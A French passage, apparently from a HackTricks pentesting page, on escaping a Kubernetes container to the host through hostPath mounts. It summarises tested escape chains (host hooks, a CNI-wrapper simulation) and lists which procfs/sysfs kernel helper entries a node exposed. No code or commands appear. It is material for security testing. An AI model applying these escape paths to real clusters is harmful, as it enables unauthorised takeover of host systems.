- l’exécution différée sur l’hôte via un hook temporaire consommé par l’hôte
- une simulation de CNI-wrapper qui préservait les arguments, l’entrée standard et l’exécution du plugin d’origine

Le même nœud exposait `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` et `config.gz`, mais pas `uevent_helper`, les variables EFI, les entrées thermiques ni `sched_debug`. Les déclencheurs destructifs du noyau n’ont pas été exécutés. Cela confirme que les chaînes impliquant la racine de l’hôte, `/var`, l’état de Kubelet, les sockets et les consommateurs de l’hôte sont reproductibles, tandis que les techniques basées sur les helpers procfs/sysfs doivent rester conditionnelles au noyau exact, au mode de montage, au chemin du payload et au déclencheur.

## References

- [1] [Fichiers et chemins locaux utilisés par Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Le conteneur cilium-agent peut accéder à l’hôte via un montage `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
